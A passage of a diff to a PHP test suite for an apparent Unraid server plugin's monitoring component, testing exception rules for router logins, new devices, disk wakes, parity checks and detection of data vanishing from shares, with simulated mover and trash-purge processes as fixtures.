+    $down = fn (string $sender, string $iface) => $e('net_link_down', "net_link_down:$sender:$iface:2026-11-20", ['sender' => $sender, 'iface' => $iface]);
+    same('6e router: an admin from his net yes — another admin, outside no; a VPN user from anywhere yes, another no; a port yes, another no',
+        [true, false, false, true, false, true, false],
+        [$cov(['net_router_login'], ['admin' => 'benj', 'net' => '192.168.1.0/24'], $adm('benj', '192.168.1.20')),
+         $cov(['net_router_login'], ['admin' => 'benj', 'net' => '192.168.1.0/24'], $adm('eve', '192.168.1.20')),
+         $cov(['net_router_login'], ['admin' => 'benj', 'net' => '192.168.1.0/24'], $adm('benj', '192.168.2.20')),
+         $cov(['net_vpn_login'], ['vpn' => 'phone'], $vpn('phone')), $cov(['net_vpn_login'], ['vpn' => 'phone'], $vpn('other')),
+         $cov(['net_link_down'], ['sender' => '192.168.1.1', 'iface' => 'ether5'], $down('192.168.1.1', 'ether5')),
+         $cov(['net_link_down'], ['sender' => '192.168.1.1', 'iface' => 'ether5'], $down('192.168.1.1', 'ether1'))]);
+    same('6e sender: every router kind of 192.168.1.1 yes; another sender no; the logins\' net shape as before',
+        [true, true, false, true],
+        [$cov(WATCH_RULE_ROUTER, ['sender' => '192.168.1.1'], $adm('eve', '203.0.113.7')), $cov(WATCH_RULE_ROUTER, ['sender' => '192.168.1.1'], $down('192.168.1.1', 'ether1')),
+         $cov(WATCH_RULE_ROUTER, ['sender' => '192.168.1.1'], $down('192.168.1.2', 'ether1')),
+         $cov(['login_new_ip'], ['net' => '192.168.1.0/24'], $e('login_new_ip', 'login_new_ip:192.168.1.5', ['ip' => '192.168.1.5']))]);
+
+    // offers: only addresses the entry itself names (the privacy rule)
+    $offers = fn (array $x) => watchmanRuleOffers($x, [$x]);
+    $ips = function (array $offers): array {
+        $out = [];
+        foreach ($offers as $o) {
+            foreach (['ip', 'net'] as $k) {
+                if (isset($o['on'][$k])) {
+                    $out[] = $o['on'][$k];
+                }
+            }
+        }
+        return $out;
+    };
+    same('6e offers: a partner from a private address — it, its /24; from a public one — only it; another key — only its own key',
+        [['pair_ip', 'pair_net', 'key'], ['pair_ip', 'key'], ['key'], ['192.168.7.9', '192.168.7.0/24'], 'Tom'],
+        [array_column($offers($moved('abcd1234', '192.168.7.9', 'address')), 'type'), array_column($offers($moved('abcd1234', '203.0.113.5', 'address')), 'type'),
+         array_column($offers($moved('abcd1234', '192.168.7.9', 'key')), 'type'), $ips($offers($moved('abcd1234', '192.168.7.9', 'address'))),
+         $offers($moved('abcd1234', '192.168.7.9', 'address'))[0]['what'] ?? null]);
+    same('6e offers: an admin (its address, its /24, the key, the whole sender — asked); a VPN user; a port; a new device only its network',
+        [['admin_ip', 'admin_net', 'key', 'sender'], true, ['vpn', 'key', 'sender'], ['link', 'sender'], ['network'], ['key']],
+        [array_column($offers($adm('benj', '192.168.1.20')), 'type'), $offers($adm('benj', '192.168.1.20'))[3]['ask'], array_column($offers($vpn('phone')), 'type'),
+         array_column($offers($down('192.168.1.1', 'ether5')), 'type'),
+         array_column($offers($e('net_new_device', 'net_new_device:aa:bb', ['mac' => 'aa:bb', 'ip' => '192.168.9.5', 'network' => 'Gäste'])), 'type'),
+         array_column($offers($e('net_blocked_from_server', 'net_blocked_from_server:198.51.100.0/24 tcp/25', ['dst' => '…'])), 'type')]);
+
+    // a new device: a made-up Wi-Fi address with the setting, a network with your exception — learned, no line, the hit
+    $ev = fn (string $mac, string $network) => ['t' => 1000, 'type' => 'client', 'mac' => $mac, 'ip' => '192.168.9.5', 'name' => '', 'host' => '', 'network' => $network,
+                                               'head' => 'Nov 20 10:00:00', 'cef' => ['id' => '1', 'name' => 'x'], 'x' => []];
+    $device = function (string $mac, string $network, array $set) use ($ev): array {
+        watchnetSet($set);
+        $b = ['devices' => []];
+        $ns = ['senders' => []];
+        $book = [];
+        watchnetEvent($b, $ns, $book, '192.168.1.1', $ev($mac, $network), ['ips' => [], 'macs' => [], 'name' => 'tower'], 2000, false, false);
+        $hits = watchnetHits();
+        watchnetSet([]);
+        return [array_column($book, 'kind'), isset($b['devices'][$mac]), array_sum(array_column($hits, 'n'))];
+    };
+    same('6e devices: a new one — a line; a made-up address with the setting — learned, none; the guests\' network with your exception — learned, none, a hit; another network — a line',
+        [[['net_new_device'], true, 0], [[], true, 0], [[], true, 1], [['net_new_device'], true, 0], [['net_new_device'], true, 0]],
+        [$device('3c:22:fb:00:00:01', 'LAN', []), $device('3e:22:fb:00:00:01', 'LAN', ['random' => true]), $device('3c:22:fb:00:00:02', 'Gäste', ['nets' => ['r0000000n1' => 'Gäste']]),
+         $device('3c:22:fb:00:00:03', 'LAN', ['nets' => ['r0000000n1' => 'Gäste']]), $device('3c:22:fb:00:00:04', 'LAN', ['random' => true])]);
+
+    // the partner door's refusals: 3 in 60 s by default, 5 set
+    same('6e hand: an admin from a net, a VPN user (asked), a port, a sender (asked), a network',
+        [[['net_router_login'], ['admin' => 'benj', 'net' => '192.168.1.0/24'], false], [['net_vpn_login'], ['vpn' => 'phone'], true],
+         [['net_link_down'], ['sender' => '192.168.1.1', 'iface' => 'ether5'], false], [WATCH_RULE_ROUTER, ['sender' => '192.168.1.1'], true],
+         [['net_new_device'], ['network' => 'Gäste'], false]],
+        array_map(fn ($m) => [$m['kinds'], $m['on'], $m['wide']], [watchmanRuleHandMake('router', 'admin', '192.168.1.0/24', 'benj'), watchmanRuleHandMake('router', 'vpn', 'phone', ''),
+            watchmanRuleHandMake('router', 'link', 'ether5', '192.168.1.1'), watchmanRuleHandMake('router', 'sender', '192.168.1.1', ''), watchmanRuleHandMake('lan', 'network', 'Gäste', '')]));
+    same('6e hand: an admin missing, a public net wider than /24 — refused', ['watch_value_bad', 'watch_net_wide'],
+        [$err(fn () => watchmanRuleHandMake('router', 'admin', '192.168.1.0/24', '')), $err(fn () => watchmanRuleHandMake('router', 'admin', '203.0.0.0/16', 'benj'))]);
+}
+
+/**
+ * 1.96 step 6f — array and parity, what holds the array, who woke the disks: the settings (scheduled checks in his book,
+ * the page's own look, yellow from n wakes a day — off by default), the exceptions on their side kinds (a VM without the
+ * guest agent, a User Script that may run, an expected cause, a disk not counted) — listed still, never colouring.
+ */
+function testWatchmanRules6f(): void
+{
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('6f settings: as up to 1.95 — scheduled checks in his book, the page looks by itself, no judgement of wakes', [true, true, 0],
+        [WATCH_SETTINGS['array']['scheduled']['def'], WATCH_SETTINGS['hold']['auto']['def'], WATCH_SETTINGS['wakes']['warn_at']['def']]);
+    $pc = fn (string $reason, array $p) => watchmanEntry('parity_check', 'parity_check:' . mt_rand(), 1, ['reason' => $reason] + $p);
+    $book = [$pc('schedule', ['end' => 5, 'exit' => 0, 'errors' => 0]), $pc('schedule', []), $pc('schedule', ['end' => 5, 'exit' => 0, 'errors' => 3]),
+             $pc('tuning', ['end' => 5, 'exit' => 0, 'errors' => 0]), $pc('manual', ['end' => 5, 'exit' => 0, 'errors' => 0]), $pc('unclean', ['end' => 5, 'exit' => 0, 'errors' => 0])];
+    same('6f parity: scheduled ones off — one ended clean (his schedule, Mover Tuning\'s) leaves; running, with errors, manual, unclean stay',
+        [[null, 0], [5, 3], [5, 0], [5, 0]],
+        array_map(fn ($e) => [$e['p']['end'] ?? null, $e['p']['errors'] ?? 0], watchmanParityScheduledOut($book)));
+    same('6f parity: … in order — the running scheduled, with errors, manual, unclean', ['schedule', 'schedule', 'manual', 'unclean'],
+        array_map(fn ($e) => $e['p']['reason'], watchmanParityScheduledOut($book)));
+
+    // the lights: what holds the array, the wakes
+    $now = 1800000000;
+    $rule = fn (string $cat, array $on) => ['id' => 'r' . substr(md5(json_encode($on)), 0, 10), 'cat' => $cat, 'kinds' => [$cat], 'on' => $on, 'at' => 1];
+    $light = function (array $s) use ($now): array {
+        $a = watchmanCats($s + ['time' => $now, 'hired' => true, 'on_watch' => $now - 86400 * 9])['areas'];
+        return [$a['hold']['level'], $a['wakes']['level'], $a['wakes']['why']];
+    };
+    $look = ['started' => 1, 'time' => $now - 10, 'count' => 1, 'holds' => [['kind' => 'userscript', 'name' => 'Nightly copy', 'files' => []]], 'times' => ['fits' => true]];
+    $wake = fn (int $t, string $disk, array $who) => ['id' => 'w' . $t, 'time' => $t, 'disks' => [$disk], 'how' => 'caught', 'who' => $who];
+    $plex = ['kind' => 'container', 'prog' => 'Plex', 'name' => 'plex', 'sure' => 'sure'];
+    $wakes = ['on' => true, 'hdds' => ['disk1', 'disk2'], 'wakes' => [$wake($now - 100, 'disk1', [$plex]), $wake($now - 200, 'disk1', [$plex]), $wake($now - 300, 'disk1', []),
+              $wake($now - 90000, 'disk1', [$plex]), $wake($now - 400, 'disk2', [$plex])]];
+    $set = fn (int $n) => ['settings' => ['wakes' => ['warn_at' => ['value' => $n, 'def' => 0, 'min' => 0, 'max' => 100, 'unit' => 'n0']]]];
+    same('6f hold: a User Script holding — yellow; that one may run — no colour (still in the list)',
+        ['warn', 'ok'], [$light(['hold' => ['look' => $look]])[0], $light(['hold' => ['look' => $look], 'rules' => [$rule('hold', ['script' => 'Nightly copy'])]])[0]]);
+    same('6f wakes: by default no judgement; 3 a day set — disk1 woke 3 times today: yellow; 4 set — not; plex expected — the one without a cause still counts: not; disk1 not counted — not',
+        ['ok', 'warn', 'ok', 'ok', 'ok', ['wakes_many']],
+        [$light(['wakes' => $wakes])[1], $light(['wakes' => $wakes] + $set(3))[1], $light(['wakes' => $wakes] + $set(4))[1],
+         $light(['wakes' => $wakes, 'rules' => [$rule('wakes', ['cause' => 'container:plex'])]] + $set(2))[1],
+         $light(['wakes' => $wakes, 'rules' => [$rule('wakes', ['disk' => 'disk1'])]] + $set(2))[1], $light(['wakes' => $wakes] + $set(3))[2]]);
+    same('6f wakes: plex expected — only the wake without a cause on disk1 counts', 1,
+        watchmanWakesMost($wakes, [$rule('wakes', ['cause' => 'container:plex'])], $now));
+
+    // the side kinds: only in their own area, never in the rules' pass
+    $shape = fn (string $cat, array $kinds, array $on) => watchmanRuleShaped(['id' => 'r00000000f1', 'cat' => $cat, 'kinds' => $kinds, 'on' => $on, 'at' => 1]) !== null;
+    same('6f shapes: hold\'s and wakes\' side kinds in their areas only', [true, true, true, false, false],
+        [$shape('hold', ['hold'], ['vm' => 'Windows 11']), $shape('wakes', ['wakes'], ['cause' => 'container:plex']), $shape('wakes', ['wakes'], ['disk' => 'disk1']),
+         $shape('login', ['hold'], ['vm' => 'x']), $shape('wakes', ['wakes'], ['cause' => 'nobody:plex'])]);
+    $b = [];
+    $st = [];
+    $bk = [watchmanEntry('flow_gone', 'flow_gone:disk:disk1', 1, ['disk' => 'disk1'])];
+    watchmanRulesApply($bk, [], $b, [], ['rules' => [watchmanRuleShaped($rule('wakes', ['disk' => 'disk1']))], 'off' => [], 'known' => []], [], $st, 2);
+    same('6f pass: «don\'t count disk1\'s wakes» never lets disk1\'s data flow through', true, watchmanOpen($bk[0]));
+    $made = fn (string $cat, string $type, string $v, string $second = '') => (fn ($m) => [$m['kinds'], $m['on']])(watchmanRuleHandMake($cat, $type, $v, $second));
+    same('6f hand: a VM, a User Script, a cause (its kind as the second field), a disk',
+        [[['hold'], ['vm' => 'Windows 11']], [['hold'], ['script' => 'Nightly copy']], [['wakes'], ['cause' => 'container:plex']], [['wakes'], ['cause' => 'mover:']],
+         [['wakes'], ['disk' => 'disk3']]],
+        [$made('hold', 'vm', 'Windows 11'), $made('hold', 'userscript', 'Nightly copy'), $made('wakes', 'cause', 'plex', 'container'), [['wakes'], ['cause' => 'mover:']], $made('wakes', 'disk', 'disk3')]);
+    same('6f hand: a kind of cause he doesn\'t know, a script with a slash — refused', ['watch_value_bad', 'watch_value_bad'],
+        [$err(fn () => watchmanRuleHandMake('wakes', 'cause', 'plex', 'nobody')), $err(fn () => watchmanRuleHandMake('hold', 'userscript', 'a/b', ''))]);
+}
+
+/**
+ * 1.96 step 6g — the two broad built-in excuses narrowed (concept 9, points 1 and 2): the engine's lock excuses what
+ * vanishes only in the office's own shares (a restore: all of it, as before); rsync --remove-source-files and the
+ * storeroom's purge only in the shares their paths name — like the movers.
+ */
+function testWatchmanRules6g(): void
+{
+    $gb = 1024 ** 3;
+    $t0 = strtotime('2026-10-06 14:02:00');
+    $ds = fn (int $r, int $x = 0) => ['w' => 0, 'u' => $r, 's' => 1000, 'r' => $r, 'b' => 0, 'x' => $x];
+    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
+                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice'], 'disks' => null, 'moving' => []];
+    $zfs = fn (array $sets) => ['datasets' => ['tank' => $ds(1)] + $sets, 'pools' => ['tank'], 'asleep' => []];
+    $before = ['tank/Fotos' => $ds(1000 * $gb, 100), 'tank/Media' => $ds(1000 * $gb, 100), 'tank/UnraidSecretaryOffice' => $ds(1000 * $gb, 100)];
+    // $after: the datasets after the round; $o: the round's look — what is told (keys)
+    $round = function (array $after, array $o) use ($look, $zfs, $before, $t0): array {
+        $bf = null;
+        $book = [];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['zfs' => $zfs($before)]), $book, $t0);
+        watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($after + $before)] + $o), $book, $t0 + 300);
+        $keys = array_column(array_filter($book, 'watchmanOpen'), 'key');
+        sort($keys);
+        return $keys;
+    };
+    $gone = fn (string $share) => ["tank/$share" => $ds(700 * $gb, 100)];
+    same('6g backup running: 300 GB gone from Fotos — told (up to 1.95 expected); from the office\'s own share — its own, silent',
+        [['flow_gone:share:Fotos'], []], [$round($gone('Fotos'), ['holder' => 'backup']), $round($gone('UnraidSecretaryOffice'), ['holder' => 'backup'])]);
+    same('6g a restore running: what vanishes anywhere is still its own (it puts aside what it replaces)', [], $round($gone('Fotos'), ['holder' => 'restore']));
+    same('6g rsync --remove-source-files from Media: 300 GB gone from Media — expected; from Fotos meanwhile — told',
+        [[], ['flow_gone:share:Fotos']], [$round($gone('Media'), ['moving' => ['rsync'], 'move_shares' => ['rsync' => ['Media']]]),
+         $round($gone('Fotos'), ['moving' => ['rsync'], 'move_shares' => ['rsync' => ['Media']]])]);
+    same('6g rsync whose paths name no share (another mount): nothing excused', ['flow_gone:share:Media'],
+        $round($gone('Media'), ['moving' => ['rsync'], 'move_shares' => ['rsync' => []]]));
+    same('6g files deleted: 30 000 in Fotos while rsync works in Media — told; in Media — expected',
+        [['flow_gone:files:share:Fotos'], []],
+        [$round(['tank/Fotos' => $ds(1000 * $gb, 30100)], ['moving' => ['rsync'], 'move_shares' => ['rsync' => ['Media']]]),
+         $round(['tank/Media' => $ds(1000 * $gb, 30100)], ['moving' => ['rsync'], 'move_shares' => ['rsync' => ['Media']]])]);
+
+    // which shares: from the processes' own arguments
+    $tmp = hardeningTmp('watch-6g');
+    foreach (['101' => ['rsync', '-a', '--remove-source-files', '/mnt/user/Media/Filme/', '/mnt/disk3/Media/Filme/'],
+              '102' => ['rsync', '-a', '--remove-source-files', '/mnt/remotes/nas/x/', '/tmp/y/'],
+              '103' => ['rm', '-rf', '--', '/mnt/hazel/Serien/_UnraidSecretaryOffice-trash/20261006-1010.purging'],
+              '104' => ['rsync', '-a', '/mnt/user/Fotos/', '/mnt/user/Backup/']] as $pid => $argv) {
+        @mkdir("$tmp/proc/$pid", 0700, true);
+        file_put_contents("$tmp/proc/$pid/cmdline", implode("\0", $argv) . "\0");
+    }
+    same('6g shares: rsync --remove-source-files — the shares its paths name (never another mount); the purge — its share and its disk; a copy (no removing) — none',
+        [['rsync' => ['Media'], 'storeroom' => ['Serien']], ['hazel']], [watchmanFlowMoverShares("$tmp/proc"), watchmanFlowStoreDisks("$tmp/proc")]);
     hardeningRm($tmp);
 }
 
@@ -23892,7 +25054,7 @@ function testWatchmanAtTold(): void
         [$r4['added'], array_column($r4['told'], 'kind'), count($lines(substr($job2, 1))), count($lines(substr($job, 1)))]);
     $src2 = (string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php');
     check('at told (S6): the kind is told like cron_file_foreign; a job stuck days past its time is marked important, not told anew',
-        str_contains($src2, "'at_job'               => ['sched', true],") && str_contains($src2, '$late = !$run && $now - (int) $j[\'when\'] >= WATCH_AT_LATE;')
+        str_contains($src2, "'at_job'               => ['sched', true],") && str_contains($src2, '$late = !$run && $now - (int) $j[\'when\'] >= $atLate;') && str_contains($src2, 'bool $changed = false, int $atLate = WATCH_AT_LATE): ?string')
         && str_contains((string) file_get_contents(OFFICE_DIR . '/docs/GUIDE.md'), 'goes to the notifications once, when it appears'));
     putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
     @unlink(watchmanLockFile($day, 'book'));
@@ -24512,8 +25674,10 @@ function testWatchmanFlowGone(): void
     $now['tank/Musik'] = $ds(200 * $gb);
     [$added4, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now)]), $book, $t0 + 1500);
     $mu = array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_gone:share:Musik']['p'] ?? [];
-    same('gone: the mover moving (and the round after), the office at work — expected; then 200 GB with nobody connected: the server itself',
-        [[], [], [], ['flow_gone'], 400 * $gb, 'server', []],
+    // 1.96 step 6g: the office at work excuses only its own shares — 200 GB gone from Musik while a backup runs is told (up to
+    // 1.95 it was expected anywhere), the round after updates that line
+    same('gone: the mover moving (and the round after) — expected; then, a backup running, 200 GB gone from Musik with nobody connected: the server itself, told',
+        [[], [], ['flow_gone'], [], 200 * $gb, 'server', []],
         [$added, $added2, $added3, $added4, array_sum($flow['gone']['share:Musik']['o'] ?? []), $mu['from'] ?? null, $flow['can']['moving'] ?? null]);
 
     // a whole share (with a child dataset) put into the storeroom, later the storeroom emptied: never a loss
@@ -24531,7 +25695,7 @@ function testWatchmanFlowGone(): void
 
     $f = watchmanFlowSummary($bf, $flow, $t0 + 1600);
     $rows = array_column($f['gone'], null, 'key');
-    same('gone on the page: per share and disk, the last 24 h, what was expected, no counters', [300 * $gb, 400 * $gb, 200 * $gb, 'disk1', 100, 10],
+    same('gone on the page: per share and disk, the last 24 h, what was expected, no counters', [300 * $gb, 200 * $gb, 400 * $gb, 'disk1', 100, 10],
         [$rows['share:Serien']['day'] ?? null, $rows['share:Musik']['expected'] ?? null, $rows['share:Musik']['day'] ?? null, $rows['disk:disk1']['disk'] ?? null,
          (int) round($f['limits']['gone_new'] / $gb), $f['limits']['gone_part']]);
     $b2 = ['flow' => $bf];
@@ -30795,16 +31959,16 @@ function testWatchmanPosture(): void
     same('posture: the VM service off — no VM can run, no VMScape', false, isset($tips(510)['vmscape']));
     file_put_contents($paths['libvirt_sock'], '');
 
-    // what it is about changes: back; gone: forgotten, and back as new when it returns
+    // what it is about changes: back; gone a while: your answer kept (1.96, concept 3.4 case 4) — back unchanged, still known
     file_put_contents($paths['sec'], $sec("[\"Photos\"]\nexport=\"e\"\nsecurity=\"public\"\n"));
     file_put_contents($paths['ident'], "USE_TELNET=\"no\"\n");
     $round(600);
-    same('posture: another share opened — the tip is back; Telnet off — gone and forgotten',
-        [false, 3, false, ['public']], [$tips(610)['public']['known'], $tips(610)['public']['p']['n'], isset($tips(610)['telnet']),
+    same('posture: another share opened — the tip is back; Telnet off — gone, your answer kept',
+        [false, 3, false, ['telnet', 'public']], [$tips(610)['public']['known'], $tips(610)['public']['p']['n'], isset($tips(610)['telnet']),
                                          array_keys((readJson("$data/posture.json") ?? [])['acks'] ?? [])]);
     file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\n");
     $round(900);
-    same('posture: Telnet on again — told again', false, $tips(910)['telnet']['known'] ?? null);
+    same('posture: Telnet on again, as it was — still known, not asked again (1.96)', true, $tips(910)['telnet']['known'] ?? null);
     watchmanPostureAck('telnet', true, $data, $now + 920, false);
     watchmanPostureAck('telnet', false, $data, $now + 930, false);
     same('posture: «Show again»', false, $tips(940)['telnet']['known']);
@@ -44608,7 +45772,7 @@ function testWatchWakesPage(): void
         check('watchman wakes page: ran under node', false, $raw);
         return;
     }
-    check("watchman wakes page: his tile and section under node ({$r['pass']} checks)", $r['pass'] >= 11 && !$r['fail']);
+    check("watchman wakes page: his tile and section under node ({$r['pass']} checks)", $r['pass'] >= 16 && !$r['fail']);
     foreach ($r['fail'] as $f) {
         check('watchman wakes page: ' . ($f[0] ?? '?'), false, 'got ' . json_encode($f[1] ?? null) . ', want ' . json_encode($f[2] ?? null));
     }
@@ -69321,7 +70485,7 @@ function testSkipPlaces(): void
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSnapPlanIdNeverReused', 'testSleepingPools', 'testSnapshotNames', 'testJack', 'testJackPlan', 'testJackNoPython', 'testJackRun', 'testJackStructure', 'testJackWatch', 'testJackSizes', 'testJackShareDataset', 'testJackPool', 'testJackImport', 'testJackForeign', 'testOfficeCron', 'testCaretakerCronLook', 'testMenuName', 'testSetupListDiff', 'testNoScriptNames', 'testPhpVarNames', 'testDetailsKept', 'testSetupDiscard', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testBackupRough', 'testNotify', 'testNotifyLayout', 'testNotifyCenter', 'testCaretakerAcks', 'testAckContent', 'testCaretakerAckDrift', 'testJackLetGo', 'testJackMover', 'testJackGatherCache', 'testJackRsync', 'testJackTidyDisks', 'testJackUpstream', 'testJackPersons', 'testJackNotInBudget', 'testJackProgress', 'testJackReadyShares',
                       'testLogsFlood',
                       'testMoverelliFit', 'testMoverelliIni', 'testMoverelliIniTolerant', 'testMoverelliMoveBin', 'testMoverelliRun', 'testMoverelliGates', 'testMoverelliForeign', 'testMoverelliPage', 'testRefusedRowWords', 'testMoverelliImport', 'testNightPlan', 'testNightRun', 'testJackChaos', 'testNightOrder', 'testNightHerPool', 'testNightPicture', 'testMoverelliRunPicture', 'testNightJackCard', 'testNightJackInHerCard', 'testNightSteps', 'testNightReserve', 'testNightSnaps', 'testPoolJackOutside', 'testPoolNonZfs', 'testMoverelliSharesGone', 'testMoverelliTiles', 'testMoverelliSuggestJack', 'testMoverelliUnraid', 'testMoverelliUnraidProgress', 'testMoverelliStop', 'testMoverelliArrayStop', 'testMoverelliPowerCut', 'testMoverelliNothingMoved', 'testMoverelliCardLag', 'testMoverelliCardFile', 'testMoverelliLeftWhy', 'testMoverelliSyncMoved', 'testMoverelliTwins', 'testMoverelliEta', 'testMoverelliPreferDisks', 'testMoverelliTidy', 'testMoverelliShareRoot', 'testMoverelliTrailingSpace', 'testMoverelliFuture', 'testMoverelliLeftCodesPage', 'testOfficeFmtSize', 'testMoverelliIdleRules', 'testMoverelliPageTruth', 'testMoverJackTruthRest', 'testGreetTruth', 'testMoverelliFill', 'testPoolLevel', 'testPoolBytes', 'testStreamerTab', 'testJackRemoveServer', 'testJackSaveReconnect', 'testJackConnectNoChange', 'testJackByWords', 'testStreamerBudget', 'testStreamerReset', 'testStreamerFix3', 'testDialogSeen', 'testStreamerShares', 'testJackYield',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testWatchWakesPage', 'testWatchmanWakes', 'testWatchmanWakeTrail', 'testMetrics', 'testWatchmanCats', 'testWatchmanBookMore', 'testWatchmanVuln', 'testWatchmanVulnSoftware', 'testWatchmanHot', 'testLogsigns', 'testWatchmanSigns', 'testWatchmanHw', 'testWatchmanCpuFaults', 'testWatchmanWear', 'testWatchmanHwBookMore', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanTeamLeadOne', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanOwnCron', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanStartFiles', 'testWatchmanGateway', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 